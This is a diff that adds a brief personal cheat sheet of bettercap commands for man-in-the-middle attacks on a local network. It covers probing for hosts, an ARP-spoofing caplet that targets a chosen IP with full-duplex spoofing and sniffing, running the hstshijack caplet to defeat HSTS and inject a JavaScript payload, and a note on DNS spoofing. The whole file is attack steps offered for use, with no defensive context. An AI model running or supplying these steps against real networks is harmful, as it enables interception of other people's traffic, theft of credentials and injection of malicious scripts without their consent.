@@ -1,1 +1,37 @@
-# 
+# start with caplet script
+bettercap -iface eth0 -caplet [.cap]
+
+# show description of module net.probe
+help net.probe
+
+# turn on module net.probe
+net.probe on
+
+# show all potential targets
+net.show
+
+# show all build in caplets
+caplets.show
+
+# set [module parameter] [value]
+set arp.spoof.fullduplex true
+
+
+
+### arp_spoof.cap script
+net probe on
+set arp.spoof.fullduplex true
+set arp.spoof.targets [target ip]
+arp.spoof on
+set net.sniff.local true
+net.sniff on
+
+
+
+# type the name of caplet inside bettercap to run it
+hstshijack
+
+# hstshijack.cap script inject js code inside hstshijack.cap script
+set hstshijack.payload [...],*:[.js]
+
+# dns.spoof wait for 1 min to load and refresh
